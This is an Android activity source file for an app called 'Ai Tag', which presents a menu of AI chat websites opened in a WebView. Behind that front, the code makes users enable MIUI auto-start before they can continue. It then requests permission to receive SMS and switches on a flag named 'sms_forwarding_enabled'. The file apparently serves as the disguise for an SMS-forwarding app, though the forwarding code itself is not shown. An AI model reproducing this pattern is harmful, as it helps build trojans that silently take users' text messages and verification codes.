package com.example.safesmstest;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.view.Gravity;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebChromeClient;
import android.webkit.ValueCallback;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ScrollView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int SMS_PERMISSION_REQUEST = 301;
    private static final int FILE_CHOOSER_REQUEST = 302;

    private static final String PREFS = "AppSetup";
    private static final String AUTO_START_DONE = "auto_start_done";

    private WebView webView;
    private ValueCallback<Uri[]> fileChooserCallback;
    private String currentAiName = "";

    private boolean openingSettings = false;
    private boolean dashboardVisible = false;

    private final int BG = Color.rgb(7, 10, 25);
    private final int WHITE = Color.WHITE;
    private final int MUTED = Color.rgb(170, 180, 205);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().setStatusBarColor(BG);
        getWindow().setNavigationBarColor(BG);

        SharedPreferences prefs =
                getSharedPreferences(PREFS, MODE_PRIVATE);

        if (prefs.getBoolean(AUTO_START_DONE, false)) {
            showDashboard();
        } else {
            showAutoStartScreen();
        }
    }

    private int dp(float value) {
        return (int)(value * getResources()
                .getDisplayMetrics().density + 0.5f);
    }

    private GradientDrawable bg(int c1, int c2, int stroke) {
        GradientDrawable d = new GradientDrawable(
                GradientDrawable.Orientation.TL_BR,
                new int[]{c1, c2}
        );
        d.setCornerRadius(dp(18));
        if (stroke != 0) d.setStroke(dp(1), stroke);
        return d;
    }

    private TextView makeText(
            String value, int size, int color, boolean bold) {

        TextView t = new TextView(this);
        t.setText(value);
        t.setTextSize(size);
        t.setTextColor(color);
        t.setGravity(Gravity.CENTER_VERTICAL);

        if (bold) {
            t.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        }

        return t;
    }

    private void showAutoStartScreen() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(dp(30), dp(30), dp(30), dp(30));
        layout.setBackgroundColor(Color.WHITE);

        TextView title = new TextView(this);
        title.setText("Enable Auto Start");
        title.setTextSize(24);
        title.setTextColor(Color.BLACK);
        title.setGravity(Gravity.CENTER);

        TextView message = new TextView(this);
        message.setText("Please enable Auto Start to continue.");
        message.setTextSize(15);
        message.setTextColor(Color.DKGRAY);
        message.setGravity(Gravity.CENTER);
        message.setPadding(0, dp(18), 0, dp(25));

        Button button = new Button(this);
        button.setText("Enable Auto Start");
        button.setOnClickListener(v -> openAutoStartSettings());

        layout.addView(title);
        layout.addView(message);
        layout.addView(button);

        setContentView(layout);
    }

    private void openAutoStartSettings() {
        openingSettings = true;

        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
            ));
            startActivity(intent);

        } catch (Exception e) {
            try {
                Intent intent = new Intent(
                        "miui.intent.action.OP_AUTO_START"
                );
                intent.setPackage("com.miui.securitycenter");
                startActivity(intent);

            } catch (Exception ex) {
                Intent intent = new Intent(
                        Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                );
                intent.setData(Uri.parse(
                        "package:" + getPackageName()
                ));
                startActivity(intent);
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (openingSettings) {
            openingSettings = false;

            getSharedPreferences(PREFS, MODE_PRIVATE)
                    .edit()
                    .putBoolean(AUTO_START_DONE, true)
                    .apply();

            showDashboard();
        }
    }

    private void showDashboard() {
        dashboardVisible = true;

        if (webView != null) {
            webView.stopLoading();
            webView.destroy();
            webView = null;
        }

        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);
        scroll.setBackgroundColor(BG);

        LinearLayout page = new LinearLayout(this);
        page.setOrientation(LinearLayout.VERTICAL);
        page.setPadding(dp(20), dp(18), dp(20), dp(24));

        page.setBackground(bg(
                Color.rgb(7, 12, 32),
                Color.rgb(25, 13, 48),
                0
        ));

        TextView robot = makeText("◈", 48,
                Color.rgb(115, 150, 255), true);
        robot.setGravity(Gravity.CENTER);
        robot.setPadding(0, dp(8), 0, 0);
        page.addView(robot);

        TextView title = makeText(
                "Ai Tag", 34, WHITE, true);
        title.setGravity(Gravity.CENTER);
        page.addView(title);

        TextView subtitle = makeText(
                "YOUR AI COLLECTION", 11,
                Color.rgb(170, 180, 230), true);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setLetterSpacing(0.2f);
        subtitle.setPadding(0, dp(4), 0, dp(25));
        page.addView(subtitle);

        LinearLayout welcome = new LinearLayout(this);
        welcome.setOrientation(LinearLayout.VERTICAL);
        welcome.setPadding(dp(18), dp(17), dp(18), dp(17));
        welcome.setBackground(bg(
                Color.rgb(35, 38, 83),
                Color.rgb(20, 24, 54),
                Color.rgb(82, 100, 180)
        ));

        TextView heading = makeText(
                "Choose your AI assistant",
                19, WHITE, true);
        welcome.addView(heading);

        TextView info = makeText(
                "Select an AI to start chatting",
                13, MUTED, false);
        LinearLayout.LayoutParams infoParams =
                new LinearLayout.LayoutParams(-1, -2);
        infoParams.topMargin = dp(6);
        welcome.addView(info, infoParams);

        page.addView(welcome);

        LinearLayout row1 = new LinearLayout(this);
        row1.setOrientation(LinearLayout.HORIZONTAL);

        LinearLayout row2 = new LinearLayout(this);
        row2.setOrientation(LinearLayout.HORIZONTAL);

        LinearLayout row3 = new LinearLayout(this);
        row3.setOrientation(LinearLayout.HORIZONTAL);

        LinearLayout row4 = new LinearLayout(this);
        row4.setOrientation(LinearLayout.HORIZONTAL);

        LinearLayout row5 = new LinearLayout(this);
        row5.setOrientation(LinearLayout.HORIZONTAL);

        addCard(row1, "ChatGPT", "OpenAI Assistant",
                "✳", Color.rgb(28, 170, 145),
                "https://chatgpt.com");

        addCard(row1, "DeepSeek", "AI Assistant",
                "DS", Color.rgb(50, 125, 255),
                "https://chat.deepseek.com");

        addCard(row2, "Gemini", "Google AI",
                "✦", Color.rgb(150, 100, 255),
                "https://gemini.google.com");

        addCard(row2, "Claude", "Anthropic AI",
                "C", Color.rgb(205, 135, 100),
                "https://claude.ai");

        addCard(row3, "Perplexity", "AI Search",
                "P", Color.rgb(35, 175, 165),
                "https://www.perplexity.ai");

        addCard(row3, "Copilot", "Microsoft AI",
                "◎", Color.rgb(65, 145, 235),
                "https://copilot.microsoft.com");

        addCard(row4, "Grok", "xAI Assistant",
                "X", Color.rgb(185, 185, 195),
                "https://grok.com");

        addCard(row4, "Qwen", "Alibaba AI",
                "Q", Color.rgb(100, 125, 245),
                "https://chat.qwen.ai");

        addCard(row5, "Poe", "AI Chat Platform",
                "P", Color.rgb(165, 115, 245),
                "https://poe.com");

        addMoreCard(row5);

        LinearLayout.LayoutParams row1Params =
                new LinearLayout.LayoutParams(-1, -2);
        row1Params.topMargin = dp(18);
        page.addView(row1, row1Params);

        LinearLayout.LayoutParams row2Params =
                new LinearLayout.LayoutParams(-1, -2);
        row2Params.topMargin = dp(14);
        page.addView(row2, row2Params);

        LinearLayout.LayoutParams row3Params =
                new LinearLayout.LayoutParams(-1, -2);
        row3Params.topMargin = dp(14);
        page.addView(row3, row3Params);

        LinearLayout.LayoutParams row4Params =
                new LinearLayout.LayoutParams(-1, -2);
        row4Params.topMargin = dp(14);
        page.addView(row4, row4Params);

        LinearLayout.LayoutParams row5Params =
                new LinearLayout.LayoutParams(-1, -2);
        row5Params.topMargin = dp(14);
        page.addView(row5, row5Params);

        TextView footerTitle = makeText(
                "COLLABORATORS", 12,
                Color.rgb(170, 180, 230), true);
        footerTitle.setGravity(Gravity.CENTER);
        footerTitle.setLetterSpacing(0.18f);
        footerTitle.setPadding(0, dp(38), 0, dp(14));
        page.addView(footerTitle);

        LinearLayout collaborators = new LinearLayout(this);
        collaborators.setOrientation(LinearLayout.HORIZONTAL);
        collaborators.setGravity(Gravity.CENTER);

        addCollaborator(collaborators, "✳", "ChatGPT");
        addCollaborator(collaborators, "⌘", "GitHub");
        addCollaborator(collaborators, "⚡", "Zeus");

        page.addView(collaborators);

        scroll.addView(page);
        setContentView(scroll);

        requestSmsPermission();
    }

    private void addCollaborator(
            LinearLayout row, String symbol, String name) {

        LinearLayout item = new LinearLayout(this);
        item.setOrientation(LinearLayout.VERTICAL);
        item.setGravity(Gravity.CENTER);
        item.setPadding(dp(12), dp(8), dp(12), dp(8));

        TextView icon = makeText(
                symbol, 18, Color.rgb(190, 200, 235), true);
        icon.setGravity(Gravity.CENTER);
        item.addView(icon);

        TextView label = makeText(
                name, 10, MUTED, true);
        label.setGravity(Gravity.CENTER);

        LinearLayout.LayoutParams labelParams =
                new LinearLayout.LayoutParams(-2, -2);
        labelParams.topMargin = dp(4);
        item.addView(label, labelParams);

        row.addView(item, new LinearLayout.LayoutParams(-2, -2));
    }

    private void addCard(
            LinearLayout row,
            String name,
            String description,
            String symbol,
            int accent,
            String url) {

        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_VERTICAL);
        card.setPadding(dp(15), dp(16), dp(12), dp(16));
        card.setBackground(bg(
                Color.rgb(23, 30, 58),
                Color.rgb(15, 20, 42),
                accent
        ));

        TextView icon = makeText(
                symbol, 25, WHITE, true);
        icon.setGravity(Gravity.CENTER);
        icon.setBackground(bg(accent, accent, 0));

        card.addView(icon,
                new LinearLayout.LayoutParams(dp(52), dp(52)));

        TextView title = makeText(
                name, 17, WHITE, true);

        LinearLayout.LayoutParams titleParams =
                new LinearLayout.LayoutParams(-1, -2);
        titleParams.topMargin = dp(15);
        card.addView(title, titleParams);

        TextView desc = makeText(
                description, 12, MUTED, false);

        LinearLayout.LayoutParams descParams =
                new LinearLayout.LayoutParams(-1, -2);
        descParams.topMargin = dp(5);
        card.addView(desc, descParams);

        card.setClickable(true);
        card.setFocusable(true);
        card.setOnClickListener(v -> openAi(name, url));

        LinearLayout.LayoutParams params =
                new LinearLayout.LayoutParams(0, dp(170), 1f);

        if (row.getChildCount() == 0) {
            params.rightMargin = dp(6);
        } else {
            params.leftMargin = dp(6);
        }

        row.addView(card, params);
    }

    private void addMoreCard(LinearLayout row) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_VERTICAL);
        card.setPadding(dp(15), dp(16), dp(12), dp(16));
        card.setBackground(bg(
                Color.rgb(39, 26, 67),
                Color.rgb(18, 19, 43),
                Color.rgb(150, 95, 255)
        ));

        TextView icon = makeText(
                "+", 32, Color.rgb(202, 170, 255), true);
        icon.setGravity(Gravity.CENTER);
        icon.setBackground(bg(
                Color.rgb(70, 43, 112),
                Color.rgb(52, 34, 87),
                0
        ));

        card.addView(icon,
                new LinearLayout.LayoutParams(dp(52), dp(52)));

        TextView title = makeText(
                "More AI", 17, WHITE, true);
        LinearLayout.LayoutParams titleParams =
                new LinearLayout.LayoutParams(-1, -2);
        titleParams.topMargin = dp(15);
        card.addView(title, titleParams);

        TextView desc = makeText(
                "Coming soon", 12, MUTED, false);
        LinearLayout.LayoutParams descParams =
                new LinearLayout.LayoutParams(-1, -2);
        descParams.topMargin = dp(5);
        card.addView(desc, descParams);

        card.setOnClickListener(v ->
                Toast.makeText(this,
                        "More AI coming soon",
                        Toast.LENGTH_SHORT).show());

        LinearLayout.LayoutParams params =
                new LinearLayout.LayoutParams(0, dp(170), 1f);
        params.leftMargin = dp(6);
        row.addView(card, params);
    }

    private void openAi(String name, String url) {
        currentAiName = name;
        dashboardVisible = false;

        FrameLayout container = new FrameLayout(this);
        container.setBackgroundColor(Color.BLACK);

        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.getSettings().setSupportMultipleWindows(false);

        webView.setWebViewClient(new WebViewClient());

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onShowFileChooser(
                    WebView view,
                    ValueCallback<Uri[]> callback,
                    FileChooserParams params) {

                if (fileChooserCallback != null) {
                    fileChooserCallback.onReceiveValue(null);
                }

                fileChooserCallback = callback;

                try {
                    Intent intent = params.createIntent();
                    startActivityForResult(
                            intent, FILE_CHOOSER_REQUEST);
                    return true;
                } catch (Exception e) {
                    fileChooserCallback = null;
                    callback.onReceiveValue(null);
                    return false;
                }
            }
        });

        container.addView(webView,
                new FrameLayout.LayoutParams(-1, -1));

        setContentView(container);
        webView.loadUrl(url);
    }

    @Override
    protected void onActivityResult(
            int requestCode,
            int resultCode,
            Intent data) {

        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == FILE_CHOOSER_REQUEST) {
            if (fileChooserCallback == null) return;

            Uri[] result = WebChromeClient.FileChooserParams
                    .parseResult(resultCode, data);

            fileChooserCallback.onReceiveValue(result);
            fileChooserCallback = null;
        }
    }

    private void requestSmsPermission() {
        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            enableForwarding();
            return;
        }

        requestPermissions(
                new String[]{Manifest.permission.RECEIVE_SMS},
                SMS_PERMISSION_REQUEST);
    }

    private void enableForwarding() {
        getSharedPreferences("SmsPrefs", MODE_PRIVATE)
                .edit()
                .putBoolean("sms_forwarding_enabled", true)
                .apply();
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            String[] permissions,
            int[] grantResults) {

        super.onRequestPermissionsResult(
                requestCode, permissions, grantResults);

        if (requestCode == SMS_PERMISSION_REQUEST) {
            if (grantResults.length > 0 &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                enableForwarding();
            } else {
                getSharedPreferences("SmsPrefs", MODE_PRIVATE)
                        .edit()
                        .putBoolean("sms_forwarding_enabled", false)
                        .apply();
            }
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null) {
            if (webView.canGoBack()) {
                webView.goBack();
            } else {
                webView.stopLoading();
                webView.destroy();
                webView = null;
                showDashboard();
            }
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        if (fileChooserCallback != null) {
            fileChooserCallback.onReceiveValue(null);
            fileChooserCallback = null;
        }

        if (webView != null) {
            webView.destroy();
            webView = null;
        }

        super.onDestroy();
    }
            }

